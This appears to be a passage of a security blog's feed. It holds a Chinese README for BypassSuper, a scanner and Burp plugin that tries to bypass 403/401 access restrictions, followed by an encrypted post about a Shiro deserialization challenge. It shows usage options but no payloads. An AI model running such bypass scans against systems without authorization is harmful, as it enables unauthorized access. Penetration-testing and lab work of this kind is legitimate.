width="49.6"></rect></a>    <a xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://visitor-badge.laobi.icu" target="_blank" rel="noopener"><rect fill="rgba(0,0,0,0)" height="20" width="17.0" x="49.6"></rect></a>    </p><p><img src="https://visitor-badge.laobi.icu/badge?page_id=SummerSec.BypassSuper" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">                ______                            _____</span><br><span class="line">                | ___ \                          &#x2F;  ___|</span><br><span class="line">                | |_&#x2F; &#x2F;_   _ _ __   __ _ ___ ___ \ &#96;--. _   _ _ __   ___ _ __</span><br><span class="line">                | ___ \ | | | &#39;_ \ &#x2F; _&#96; &#x2F; __&#x2F; __| &#96;--. \ | | | &#39;_ \ &#x2F; _ \ &#39;__|</span><br><span class="line">                | |_&#x2F; &#x2F; |_| | |_) | (_| \__ \__ \&#x2F;\__&#x2F; &#x2F; |_| | |_) |  __&#x2F; |</span><br><span class="line">                \____&#x2F; \__, | .__&#x2F; \__,_|___&#x2F;___&#x2F;\____&#x2F; \__,_| .__&#x2F; \___|_|</span><br><span class="line">                        __&#x2F; | |                              | |</span><br><span class="line">                       |___&#x2F;|_|                              |_|</span><br><span class="line">                    author: summersec</span><br><span class="line">                    version: 1.0</span><br><span class="line">                    Github: https:&#x2F;&#x2F;github.com&#x2F;SummerSec&#x2F;BypassSuper</span><br><span class="line">&#96;</span><br></pre></td></tr></table></figure><h2 id="👮🏻‍♀️-免责声明"><a href="#👮🏻‍♀️-免责声明" class="headerlink" title="👮🏻‍♀️ 免责声明"></a>👮🏻‍♀️ 免责声明</h2><p>&emsp;&emsp; 由于传播、利用BypassSuper工具（下简称本工具）提供的检测功能而造成的<strong>任何直接或者间接的后果及损失</strong>，均由使用者本人负责，开发者本人<strong>不为此承担任何责任</strong>。</p><p>&emsp;&emsp; 本工具会根据使用者检测结果<strong>自动生成</strong>扫描结果报告，本报告内容及其他衍生内容均<strong>不能代表</strong>本人的立场及观点。</p><p>&emsp;&emsp; 请在使用本工具时遵循使用者以及目标系统所在国当地的<strong>相关法律法规</strong>，一切<strong>未授权测试均是不被允许的</strong>。若出现相关违法行为，我们将<strong>保留追究</strong>您法律责任的权利，并<strong>全力配合</strong>相关机构展开调查。</p><h2 id="dragon-来龙去脉"><a href="#dragon-来龙去脉" class="headerlink" title=":dragon:来龙去脉"></a>:dragon:来龙去脉</h2><p>&emsp;&emsp; 在某群里看到大佬发了个这个项目<a href="https://github.com/sting8k/BurpSuite_403Bypasser" target="_blank" rel="noopener">BurpSuite_403Bypasser</a>，然后看了一眼这个具体实现功能。因为在此之前在推特上看到国际友人发过类似的tips，当时就挺感兴趣的。但找了一圈并没有发现有什么现成的扫描器或者burp插件，当时是不了了之。这个项目发现之后，我第一时间就去看了一眼源代码，输出日志，发生很多payload和内容开发者是理解错的，或者是姿势不对。当然我发现之后，我开始动手在此源码上开始我的修改之路。截至本文发布时间为止，也有人发现这个问题，详情参考：<a href="https://github.com/sting8k/BurpSuite_403Bypasser/issues/4" target="_blank" rel="noopener">https://github.com/sting8k/BurpSuite_403Bypasser/issues/4</a></p><hr><h2 id="zap-Installation"><a href="#zap-Installation" class="headerlink" title=":zap: Installation"></a>:zap: Installation</h2><h3 id="BypassSuper-Burp"><a href="#BypassSuper-Burp" class="headerlink" title="BypassSuper-Burp"></a>BypassSuper-Burp</h3><p>&emsp;&emsp; <code>BurpSuite -&gt; Extender -&gt; Extensions -&gt; Add -&gt; Extension Type: Python -&gt; Select file: BypassSuper-Burp.py -&gt; Next till Fininsh</code></p><hr><h3 id="BypassSuper"><a href="#BypassSuper" class="headerlink" title="BypassSuper"></a>BypassSuper</h3><p>&emsp;&emsp; <code>pip3 install -r requirements.txt  --&gt; python3 BypassSuper.py -h</code></p><hr><h2 id="clap-参数介绍"><a href="#clap-参数介绍" class="headerlink" title=":clap: 参数介绍"></a>:clap: 参数介绍</h2><p>&emsp;&emsp; 您可以使用<code>python3 BypassSuper.py [options]</code>命令来运行本工具，<code>options</code>内容表述如下：</p><ul><li><p>-h（–help）</p><p>帮助命令，无需附加参数，查看本工具支持的全部参数及其对应简介；</p></li><li><p>-u （–url）<br>要扫描的网站网址路径，为必填选项之一，例如：<code>-u https://www.baidu.com</code>；</p><ul><li>-f （–file）<br>要扫描的网站网址路径文件，为必填选项之一，例如：<code>-f target.txt</code>；</li><li>-t （–threads）<br>扫描线程数量，为选填选项，配合-f参数使用，要求必须<code>target数量大于线程数量（默认20）</code>不然无法执行，例如：<code>-f target.txt -t 20</code></li></ul></li></ul><hr><h2 id="clapper-Screenshot"><a href="#clapper-Screenshot" class="headerlink" title=":clapper:Screenshot"></a>:clapper:Screenshot</h2><p><img src="https://img-blog.csdnimg.cn/20201207095047803.png" alt="在这里插入图片描述"></p><p>&emsp;&emsp; 安装完成后自动扫描，在两个地方可以查看到扫描结果。第一个：在target里面，设置过滤器全部显示或者显示4xx。<br><img src="https://img-blog.csdnimg.cn/20201206225513435.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201207094215278.png" alt="两个"></p><p>&emsp;&emsp;  第二个地方在仪表盘<br><img src="https://img-blog.csdnimg.cn/20201207094338881.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 在插件拓展里面可以的UI可以查看扫描过程（建议直接输出到文件方便查看，UI里面只能查看部分，会被覆盖）。<br><img src="https://img-blog.csdnimg.cn/20201207094526995.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201207095902133.png" alt="在这里插入图片描述"></p><hr><h2 id="clapper-实际案例"><a href="#clapper-实际案例" class="headerlink" title=":clapper:实际案例"></a>:clapper:实际案例</h2><p>&emsp;&emsp; 靶场案例<a href="https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented" target="_blank" rel="noopener">URL-based access control can be circumvented</a>，这个是portswigger官方给的实际案例。<del>悄咪咪说一句，上面给的截屏是一个真实SRC案例！</del><br>实用burp插件效果<br><img src="https://img-blog.csdnimg.cn/20210122195343459.png" alt="在这里插入图片描述"></p><p>使用BypassSuper脚本效果<br><img src="https://img-blog.csdnimg.cn/20210122201042177.png" alt="在这里插入图片描述"></p><hr><h2 id="memo-TODO"><a href="#memo-TODO" class="headerlink" title=":memo: TODO"></a>:memo: TODO</h2><ul><li><input disabled type="checkbox"> 添加参数Bypass规则</li><li><input disabled type="checkbox"> 重构代码，目前所有源码都在一个文件中，太杂了</li><li><input disabled type="checkbox"> 自动扫描网页中的api接口实现BypassSuper中的“JSFinder”</li><li><input disabled type="checkbox"> 目录爆破，配合JSFinder</li><li><input disabled type="checkbox"> 自动爬取网页实现爬虫功能发现更多页面和接口</li></ul><hr><h2 id="📝-意见交流"><a href="#📝-意见交流" class="headerlink" title="📝 意见交流"></a>📝 意见交流</h2><hr><p>&emsp;&emsp; 您可以直接在GIthub仓库中提交ISSUE：<a href="https://github.com/SummerSec/BypassSuper/issues" target="_blank" rel="noopener">https://github.com/SummerSec/BypassSuper</a>亦或者发送邮件到summersec[@]qq.com</p><h2 id="hotsprings-已知问题"><a href="#hotsprings-已知问题" class="headerlink" title=":hotsprings:已知问题"></a>:hotsprings:已知问题</h2><ul><li><a href="https://github.com/SummerSec/BypassSuper/issues/3" target="_blank" rel="noopener">Exception: local variable ‘req’ referenced before assignment此问题是主机设置全局代理问题，目前没有添加代理功能。</a> 解决办法：<a href="https://github.com/SummerSec/BypassSuper/issues/3" target="_blank" rel="noopener">关闭全局代理</a><br><img src="https://img-blog.csdnimg.cn/20201207100058886.png" alt></li><li><a href="https://github.com/SummerSec/BypassSuper/issues/2" target="_blank" rel="noopener">结果csv文件中文乱码并且格式不对。</a><a href="https://github.com/SummerSec/BypassSuper/issues/2" target="_blank" rel="noopener">解决办法</a></li></ul><hr><h2 id="book-References"><a href="#book-References" class="headerlink" title=":book: References"></a>:book: References</h2><ul><li><p><a href="https://twitter.com/iam_j0ker/status/1324354024657711106?s=20" target="_blank" rel="noopener">https://twitter.com/iam_j0ker/status/1324354024657711106?s=20</a></p></li><li><p><a href="https://twitter.com/jae_hak99/status/1297556269960540161?s=20" target="_blank" rel="noopener">https://twitter.com/jae_hak99/status/1297556269960540161?s=20</a></p></li><li><p><a href="https://twitter.com/SalahHasoneh1/status/1296572143141031945" target="_blank" rel="noopener">https://twitter.com/SalahHasoneh1/status/1296572143141031945</a></p></li><li><p><a href="https://twitter.com/infosecsanyam/status/1331146922011324417" target="_blank" rel="noopener">https://twitter.com/infosecsanyam/status/1331146922011324417</a></p></li><li><p><a href="https://twitter.com/i_hack_everyone/status/1332027600726753280" target="_blank" rel="noopener">https://twitter.com/i_hack_everyone/status/1332027600726753280</a></p></li><li><p><a href="https://github.com/lobuhi/byp4xx/blob/main/byp4xx.sh#L70" target="_blank" rel="noopener">https://github.com/lobuhi/byp4xx/blob/main/byp4xx.sh#L70</a></p></li><li><p><a href="https://twitter.com/jae_hak99/status/1333811754745249792" target="_blank" rel="noopener">https://twitter.com/jae_hak99/status/1333811754745249792</a></p></li><li><p><a href="https://twitter.com/h4x0r_dz/status/1317218511937261570" target="_blank" rel="noopener">https://twitter.com/h4x0r_dz/status/1317218511937261570</a></p></li><li><p><a href="https://github.com/KathanP19/HowToHunt/blob/master/WAF_Bypasses/WAF_Bypass_Using_headers.md" target="_blank" rel="noopener">https://github.com/KathanP19/HowToHunt/blob/master/WAF_Bypasses/WAF_Bypass_Using_headers.md</a></p></li></ul><hr><p> <a href="https://starchart.cc/SummerSec/BypassSuper" target="_blank" rel="noopener"><img src="https://starchart.cc/SummerSec/BypassSuper.svg" alt="Stargazers over time"></a> </p><img align="right" src="https://profile-counter.glitch.me/summersec/count.svg" width="200">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 align=&quot;center&quot;&gt;BypassSuper&lt;/h1&gt;
&lt;h3 align=&quot;center&quot;&gt;一款针对403/401页面进行快速、高效尝试Bypass的扫描工具&lt;/h3&gt;
 &lt;p align=&quot;center&quot;&gt;
    &lt;a href=&quot;https://githu
      
    
    </summary>
    
    
      <category term="工具" scheme="https://summersec.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="未授权 401 403" scheme="https://summersec.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83-401-403/"/>
    
  </entry>
  
  <entry>
    <title>一道shiro反序列化题目引发的思考</title>
    <link href="https://summersec.github.io/2021/01/05/%E4%B8%80%E9%81%93shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>https://summersec.github.io/2021/01/05/%E4%B8%80%E9%81%93shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/</id>
    <published>2021-01-05T00:22:16.000Z</published>
    <updated>2021-01-22T12:15:29.008Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="39f52711c8aa7ee6fb2d497fba360365c0c01e8f917549d6249099dc2026902a">660e1430c9014f049a3f1080ed1fc3b29e9ccb6963fd15ab8744666d3a501df7335e8159f53ae9e2e0a6ddee63c610f2091c6aff36d57d662844be10b5ce51aa88c9c283ad5fe4a2afb8a48304f77d50be487809667dc440881d9e754548ca7ffcdf8576f6981967491b2cbe38323a0624c150cc2224e443d38cac36eb6bcf5d2f8c7ada0b46ce875ea335f1500badb690dbd1489464c55477ccdf888f8f4773c8c1c3b1d061e3e166867e805bbe8d4cb0d6758ef6ba1a5bbe4676a2f5a1ed20eb81f28cfc7ff842803ec757a1a9cfd111823dafa41a9f9cbce23c6ac2a19d329ec2846f61758a6828f16351e71be266a3f9750aff3a1f76f512a1be3a9f525f1d9941b93b7505a8cf652bd07360b374d20ca712b0cdfc91f25fa2a00d1f9aa0932772cbeeb5d4c8cded7faa90a306cba08cb7e9b6d90aa9eaa31880f9d44ed4b1a8d1c823e61ed37b073e8ae3b9cf2951b4d0262198474fb2803ff466c68a372676188ee6286e6f8a27348b9664bc2254d0c2eb2a80c60bb10b7b246f24d27a1288e94e0dd95fdb035774398423ffa2cd3fc22178c6adac2adb1390b927fd51c9e3a4d58a64542483d93ff3d7900d2861b14f5c5c8e71644742176042970a13bac1040820d4dff35699a3c9cb7f15e9a2eb1975fde008664be0edd081ce0d88b6c6d8275541e84896cf0d553be35b0157befc80ec629f54b82a0dfc422eaf972d0178969252f62ef72d99d2f6b3defc54ae8c9505022dabeb6b9bf776f0f995cd1e141e7ee8b9c338ddaa4921745fee960dd1e897365d4af1d935dd8ca79e65c951140e1905b79fd2a7ef85482259c5b6ecffc31f3b44071846b2ba6aa975e5b7dd6b37f4d203c3f9ea2437a13a569e9b0f478de036117da8b14f38a2e5e099cd337f8f315e847545e495aee71936ce2f451ab0c5b26cae3bbd5c09e8d2386773538e8e1e43fc0068c640a47749e9412eacacc91720e0d521434f98135ada5201af0ef1e9c706271787ca0de3d0386043aeb5cb67fbd80508d0537fb74d37917a09fb18d54b73e243bac8a0d3cd327e585d5ee97b9ebf5ee27ec03d88b133189d727bde8cc7690b8a5535a85315d9f6e4db26a0bc2e1686cfd61c3c88d5f4425e619d2efa3cd840f3e4842481494e55127b48cd38e0d337723bda808a026a882cee679219ebb8842a9d061fcc627e5045a7263c9cd613f3c1e4d0673333d9486dcaf0399bbc45b53051a10244c6485f8a350bd29ba22ab3e80feb81c32e1e622ae5912459fcb3328617cea069d9e04e0cfd3e8ab821667e1b1fe91677b62240570c569d722e3f61354b76561dbf19bebcd2221e3e87009e9cff90bd8ff762f9e29cf306c42963217069f7f985510ac05f90c642ae4d19742daf80f6ddee450a999cd0c9421efea17ae34d14055350518d0dcda1cdbabe42dbbd9ef18a98eba68bb3cb8394078e01c7823ecf0f5549928928a3c4b7f9687557c53d22c517328773c1164276c9f77c2ce7fb33c1f86f9ae33fb6241a9c7afbfe67d6ecf3567d243254596a109a1aa27b2594059d7892517ea48b6177472021267d6f335b10298cdb41d2f31171a351453ca6dc532e35cff74dcc027eb569e157e6c84a0ac08c8f4165ba114cc9cc4696b74760699601c09918e862ecadc833e97d6caa8b58da80799089032726945fea0f540f1783caabc95f2b4d9dc7c876eacfe50f96221ca154702627c1e16cbd1e6d8770683ae38d6bc8fc52cbcf497169405ba517946e11dce701c4af88b80bef5f869f591c5d7043ad89ee45282eb4f9af2f998db891be26d3d914787da695735babdedaee63907130cdfcf9cdfd72ba31a3a6fc6296d358ad97a2ed0e8c1ddb5e9d71e29d2ec9cc4ac596b79b6d98457842cccb0c4cecf3185fc5748e65dd9a21aa0506491ff30585c386e6eafd2d7ca16833da3b576b87875bb8b1b4518f7745981cd88ea9630d9dc91315b6599919c8606c7afabd88e524bd49b5e98713c9e2a14fe0fbafab72faf5d00459a0209d48dfdff5c8da94ec285db1cd88269bd023d9f2bafb4900550d79e418d0ebfcec20432345dac17dee22c329f0fcac1e1c320887e3027aced9efa8b3e2ee3dee7582b0480cb0a9b3c2ff8d11919b5bca40046fe75efe49f2e25605cd93bbff0e313055191e381315bedd5286f06340d84bc06510c095df2aee09c8d1ed5e115738d1b415aca1d455dc4169f622fe73369b88b139c20372810198974e7c54e7b5eab7e9d7cc3b568e71a10afcbe8e2d5a09922c303daee4515d5b53ead709abf8134e97f55f4039826ee56b3330b2cd959b52447f5e71ca68de570a9a21969def3804fe19366e8f74b98f058efdf7ec665311f4f4b4ba6814adb43933b998d9f376e3e76816aff22c0e81a5754feb31e40ccd2b0b655746bb72d3b6d4dbb2de17889bd25bdc1c432e64b687bb7b7ef161dbd87de54d6734d4859854005448c08f9882f9da43c6ccc7745681dd817236c61522bb0c0d1de0089412e3746ff8a1e46450a2712c039f0c1717d60f07585acc53c77fbb989c16758019fef42a68d62082b602d7e432418016507c1b2f5f33146e8b030c0abb2fddbb87d9752ac69ce909771502680bbf76d72a4b09e1e78dc6b632e8a91d3b0daa773e8c0a9902ea108f65af80fcf4a3bfe2df9a26ef0503da0cb122125c3e5e66aa37dbfccb925452a5a65a2b22def53525dfe7bfff0d9188e94bcbcf64e3a6ee047475e8fc37ee139490e53956ea0506bde7b08e03fbf39cfaccbb1cd4e424cc8d4a95f3a0ce55b92e03561e4dc99c6dd6b3632c20b9677fc5c48fb9d0ef91f2d6c2f2229a67a2c67ce6a7b19cdea1101fd2198d95865dfae301eff66899030f740d60ebb5f875c5875d07286bbcd53268f356f3350cf3b133a346ea738e1746e49b5a48f9424c22b68541eed3bfdfac34574315e3e608d391c11e5c534b873e3f696bbbd57686e902b3fbf66a2dd640d99d238e5fa27e2eeb7917723a81741d3df6cc3224819b0962806a77c0783a4049123c7621c047e9d82ad270902808490db298a525157ddcc2eba2d6a83cfb5fec66efb02c3d373274b28c405223deaaab24f28e0201ff466ee1bed7cdb9fb6e1fef5c7f3b64fceebb4ad1a6daabef8d35b81a93aa68ca6cd1b9eb4fba6dae17d41ecaa9e65f48794ffbe8542cce1eec8be53c514f0a1785f10a967544a1755b70fc26129ed001ee9ec7fe3fecadc19ffdfc02593e69d94e3c9b998c981569a050c5a98cf9fdeaebf5a713f1605fcfdf98f13663af50d8566fb508a15c241db4ce743728ffaa40966e625c4974e54acc94f73e192962f3a66b0e0185fb47770fd87d78c68ea3b8e9e957a87cda3496909d98045a77a687e6751c5d0249e3edda539e110500cbf0a450b9bc1cb3f0201aed6de08ebfc10734316a90c3486ff2aa58543fb79ecc4d77a408750c3fa84daf7f2c11d053b9b9c3f03dda8a17193cb0019ac47a82aaf63fbc00b66a7fc07a4368671fe159c46cad13cb87e1fbae0ed4a873324a2774c567f0251adc233023429d9e6e215ed831cccfb643d15d7db9a0edeb537f6147b4442c65213ecefd937ff145fb57bb711669b563589d4ec7ac1b92c3b5bc40bafe4d20fca314f97943744e8ca007600086a3705c642877bb9ad23fd08af794b8c5bfa1e2a485d7e3b31988cd4a234b6a8698290dccbafdccd6b975b1c38ae676588422681da253fc4c5aabb20d022b9e8b9acde476310f4ebee4c937c7f8371a024174ef30820f49507a501398e8975c68fbfce1977d9850122144bc4661223d327bd60fe005c075edb8956a063f5c3172c8dd6d042578e903c94f767998595ca4d25f817e24f3f7722115a46aa0a7dd8d0df8054dedd1a47f3dba5817a2812860685e53b65e56d9619aede63114fd02d042d510dc24f317aa89b29b58199d21819884434cc47a8b398b7c619a3c2ec45636f6ba9381c8253442560282202990b53f23b86ccf249a1886a6650bf4e2f8f175e1362f3ff6ed2f77a883ee7289c50231c009622139ec33f150e458e027b892ba073de83d41e8943857a07fac99d182e284f9bb1def4049e03515140fb5f62f282b920d3fda2f5b604402768606bf755a01d00f15dae13bbdd1c833fb22be08e275ba6ea9a3ad210714bd60dd748a60f881fea0135c5271c2a84c72b6c985826f1bf04b04b3df615383a24cc6e028a7c9ab595e0ee6819b4c9a2227efbdc37bae4b473d828ba5afa28c5504c011a6fe91cdff14aa26f75c52444714334f0eb5af2bc02c81fc74d3313a5fb23ed49048494c72efd5fc33e9bebbd69b403241dbf05ba90b71162b3977abb70b825da3eaf3f14ed1838878512a18d6a87139874f2c739a67fef45d46fe26dcb99fb5daa87cf84cc0454c395e66c7f1dd5ddccdbbe3a7f5daf18c2a097758ae0e174f2c2cc6ee086e05d892b1beeecbdce76463820f4236c85167c918827018467de051a2841a722731fc2f4ca516960ae7031988a1dbf111a011f9012db1c070b315ee40ebb4e0717332305b52477828f3da2d6a277e50a12b04790ad9842f0844181b5c775e79a83a7d1b92ae8a770014887d08d23306d781f9f20c31c7f432ab0210ec394f328ccc02fcd754ac2eb331ac3ff87779b08a6018283239a3b9d4565a5269b18c6e36ffa133b9a1bf106390c4f7f02ee477d03f710bc912d50f2a6cc186df37c34982245b84463115ec8d5ecd91bcf62d640029ab5412c233ceebd12ba5dd3af461ec147a6bf1580a90fda5975b2cf5be889a39e5d5f1267417ac571cd79d5031ad7ea7d7620482d4828d02e78e1e6890fc5103d28a0f8c42584a63c8f2e3f75d298a4b3a802e084b9a7a9d7e8b86c4222ec566293dcbeb871d8b85e4a8996788f7b798bfb1ab4c7e411f5a4cffe6771a4008b1fd8d842cddbfc285363fb8f3087304580d640c6cebdd60d46dd11c73e1d70a7c6dac27352860469ffb17aac456de10cea4590850263c87300d2a03a774665fad356eaf1727206ce4da1949be125c438586be0a8961085f4d993b5eebbeb5ec2950fd28d7e8224b26047dfcdc1e76dbf888d05289d7d2ec7e4c840bdc06b5001b3763f7c7895bcfda9272f4645a26e1f77a66c2c9efa62bde147502bcfa9875035093c68250eabbc0e9ab9475126a401d2b74fbdb98850494dc5bc4f372d88e4d97bb96403c826a361c2774198da80cbad7cfc29f4889c23d8a60bd9a320a13128f65e4ddcd47961587a873c3ffa4088d3767eafae30d8b929f0abb5b66bb63f03bcee6e7239ff0663df622dfac942a373595c7e8a6c64540314f7bedd9f3142808e5be700d281fe119bb542c9f6052edbb5cc690a4499dc1e88c945f4d2787db99bdc53e0745e832a6553e339be906ec1e1224a7d9eda9c5dbcfc77b0194b8c33471164c81286f49d228fdaac19598d0f49a5499871e04e7507bc88a40f2f1324e996a7e3a859b14bfa716130d88ca2b5fca379625c49ff7410ec0ec0d40e42e2216e9fdd98d5b38c7352dabc6c5c491b24c71b1532c9c0a9fa2769f8c8e073a55179970cbc7b5cd10169d8b342c405cec187a28066cdc55cfaba66c00b70d4c92cf30401debd1101f4a9ed6b70644b0eabc1b00aeb23ed2583ade9f4c29f0f9ba396a9ed764638c25bd480d0be29fc35a2e66d640274c0da0f1df1c64382dbdf5534adf0270dcb55318fb7f755429b490b77100dbb9c08bed0405f6134de7a5ba69e272c4a3817e5efc164734a8ab2c7e2267adba73603a4f22e114dfdad7cd2892fc20a46e05a43f5de218e94603533b35b5ab44fdda65a8c441b69e1232534257800e8a73431da868798a21d57b0434f4796736a6970cdc68db2a34447673aeda8a8ba8671d2e7433eb1b17c283e1e87890f058f0034a1be269f6ebb4f312c47924b685ca7070bf2937f8b8c128d62b84acb5df7dd0f565386240637b4d68174c78fb117fb39439771ee4d1761ff77ca2fbf0bc0c40cce300c294fdfc5bb0d6f33f3b8c61248c06a6616362eeec66adb05ef5a6f01cda87a756801c3cac8adab90ad7ef963462f8ea17a0f457e50a69489b10897308286a2fc339df35b46b0ccb5290726b6ad1e26b34e2d242e07039639f2b457ae5fe27f196aaa38349d3a3982bb645695a5067bf3f0be287d6c337f3bddbbd0de8f625b9a09f95a27bcf8b487eec9759bc0039661dae350ef3d8db6bed76192549a7549e2f56f2bc35318babbfa660f09fc1c6338b93465d73aff610121ce46f7d43e50e89aae2f874bf41d1c7bedfd86da10ae41ca1d18d92742c425e61816484554dbf724d270c1053fcd30e662776fa4c85392651d0c484737d6e2da1c1b51c20817c28c67b263dd4c5b5e4439f6455eadff129ae9e26adada4e61bee7463c68e0ea2b96c62a5a971ce08aea2d199febaee3c369e2db48fc6f34e9f137091a8ec660c9693eff18344c5854da86606ab65b3e32eb3bee60a20fce6a95e1e23a0bad8cefe2486e2d1f8549e6df527873f2e9c3d47530250e1b12163a68b5c05d44c3f94824c29a1b35939a3eec74c8eeb8fdb0cc82f07ccba0a7d76e6fac3548ceeca0498406b0f1dd8c355006ec9d5fa108d8711acdd31724405efe3da487fa633c66d4e75923d3a60ecef0ac1db0c22d30f0c712b906c92528e2232648f61c7c677e42253b7504f652f9b8708e3dca82d8565bd786dcd3f4721fbb4038e14f42d4d1dd8938d5464e93608e2c00cb7a233982825e1f802baf5f99ef9af70887539867ca15f0d51174ddfc1752e8099ee7f9eef21a5b23c548def3c73918b6142df6cc597fa0b8dc6e75d403fa7b07ea08022ba1660d0ea9513a482c16857a0ff1ab2c650bd3695fe78ee5167c29c102093efda344bb36fedbf464a8cbebb4234c8d6fd8f1be02bd3837e699294f33eee4391def6a29fc0c6698561cdd6f56a5bbd4e66399c67fa593381598cad701d37eb55899ea1cbe6eede1e02d58ede53063504e227488f8dfb20acb317567cb76d2240dc77a1b6dbc5d8d0fefca461f80850fa0fd621f1cec2e3b809792fd7914678a8560cc89b23e7bbdc093c801d4d05a6623cc07fec5567427504cdc4b908fe15d979457079a4f1c555544a45de0cc08939dd3533ea120094c982228b9206930c2007817555f05ed606ec620655b8da1c0253361daf1e94de2ada44a13cebe086b9c4bc80e940e5a6f1480db24192170bfeb4d8751d6a9705f43377d3ce234954b2dc77034ba790cc5fe6ac69814e884ec9974092244e225d34ec7388848f8fb617d701740bacb193ab19d0e8a5ab9c9e733613428bfe568be08fd028d95112fa31fc7c5490afc4239deaf3c8830de137cba78864ab468ba508d1f570c8169153d618cffefc369cd2a1ab50127f39c01e6bfb824900a60dfaaa2da3d67a1d0477c2a4178c715768dd277afc2ed11cd92765c4b160b76e8d78a420e081ab970133ae1f441ab39013b9e6f0ec2b3653c7700319602d5653a60c3aca41df2efe6668495f853016f712b12fbd0855876dfd88d208a19d1c73ab875419d6892d373b3501e2a55735834f0121ceec5e09f87e6c6dc4b806676e41919151b1f4c80e4531ee1edbcd3c5fc9c217d0c751b71345bb958fc424b13cdcff1783c3373322159455cea2f66a50c741d0f9d2c62434837132d0b39875c7256a6d24270d83d8f03799fe0938fda22254a93fd3ea6b482bc19def987a97ea7cab90def26af6c3fc2a12ece34bc1ecfd39cc8d99ec67e4203de4797d368f9939497cd90b9b971b687c8ab627a10e473dab08c9a6a1f0979a9e8b85d9a7c900ca5519a8d424d87bfd4c108734b8c1b272cd048f81706e76536314e13b1230c114b6d5e362d3bc1fdbe4e03dfd1e3cd67e5f134aa3d73284f551ac86a995e37de91b530212e2c84fb4c0bb2ef32127cb6776c2a5dff0ddda371d6f14791c78d11b02d221251493822fad2f126f111ade7b3b0b7fdbe502b34c74fbf2b42cb63323e3e71d8619129e24542941e8c23492293ecb4422af63d2e6e3d6ad48ab4a1a2f68ad0c7694b29d759a3340f14f850cf72913cb830c86f034266c12a7d405381ece40305b0fdacdce157bdda385d11e617b42a60a04aa52b0cdf1135b0856cf77316ec8aee4066afcc93d0c2861fa2d67aa4a323c202ba51297b3ea1b5df83f41a3cf9db7b0690e93a816f6f112ebec082701da9788a1bdb5bb64349afaab8615d2ec37ed992db81063e9c88e002eac8c4d75089ddbce2aea9f1275f9d0341fd55a7ee70afe31ec13a6a840adcf2a2b3cd91c5ac548bf8fd37cb6f1a78eb5377d91d9e043ed8ee73ea8b54c9774395bea469087fc219101292e80f6b3513eff3b4598cefd14083036bc9f70d6aa34a02c4451caaee4246b4df7dd674aa526af515274fb456bb188b640afd80a76dd6c765270d559fa799358eac0b4966355f065131e4a74dec72fe513acdcdd8fda838fc4bd1fc29d823ab9fbbf259ba713838464afd7fa4f749c2827040ad88fbff6a9f5030b295f6fae018a0c42285501b77466a53497a6c33f8ca632cfb8032d3dec619397dfda9dda864fbe19ec4122114c3ab16b44a1b06d21225c1c18d6b1e567833b1fb320a6fd2f76771cde6422cf436e5e5deefac14a726e97cc3ac40930a1d13a142be37114252d6cc942dd0ca7c31f654466e7c0dc112b5a5e875d9183f6264c75a79dd68992ac736fb18867ba411f4035fb83deed51b103e76d8dbf897296839ea9dd7a74f7348445a63ce6a949464c83b010250c7ced7898eaa65e73a0231dba026ac920d3d283f52d80138c9f0c723fba0e124a5b13a38d1bd4772dc9ca13cb89b01aa70e3fa50983af77510e2f2813c33fbe83e4f064485be87bce89a20fb7c6ac2c307acbe04c0c32922ebf2617ad13a47c465cd9b945648cc181c1059bd081325c10786f40356269d87263d6b10c9fdd2091c2c396688fdb7e829b1608d9eacd229b19dba2f47047712e6ba6966170e1c7bc2c9fb1a5b08d8b725f838d4ca92748e546c8d1bac262e51e96361cf2492275fdf8f0bf40fea74d6336015767878c88874c2974f4d0e0a5c61481f40c49101ffa5090fc163c73defcb9f2b419a1bb9b3375ab8478593ae32dc2ebb4b446622440afbdb3a939613366c7a22d3d1ac23afd4fbca8b88eb37e6c771a6861999476f156d27ca26bbf062870ad37ce01be30c1bad151a8c909f731e2514fc5b856ff02d4d1e248561650a9bd26ef5a5f5edbfd8653bda01aee60a94d72fa7a90dfb527b1c75ffc2778b1b60c7a6ae23f2471f915b2e3698eeb86c980d7388d98839395e2f437715a7b8336a11c517655178c72ad18889e6ce9fa00f905478bf05295033e5bc66ce918d94af2cb4bd1bb50139bca8d1d2c91e90cdf42aeadea15eebbfcc01dc60b248964e0c46a36b40428f8ddcd86cbd005e6f0f18230252451162f0c4f55fa9413be508f35316d5a29657cbb76c14a3ab6132020265d2dd009f0f95c7521b5948a041d9c6312ab55f7072cecfd618e2411beb4f81dd4e2f8df34b284748209cce27104699f0eaaee8487264e453a1a3225c4cb6f206ddf5948663f854d2b3f533181ffc57a477515ebab7b53fdcfa18f131f23695f74bd1ab3ff5fc3c4ff6b130187559dcd487bc0f396009ed9dc1da8dab89a2b6f30fb240df6aa705e94d6255bc73592df0e5529599c501419de29a0433520e9998479014b28185efd0ae36a704ba12541c2ec7f2070831231fc10a4401c9213c03897db00128911588859beca17130e622605c4a446e4fef4ef64bf00773df93ec5a1b44d3d156266e50be4fe7e84791dd012a3dbf67892e2216e8c9e6b89297b0b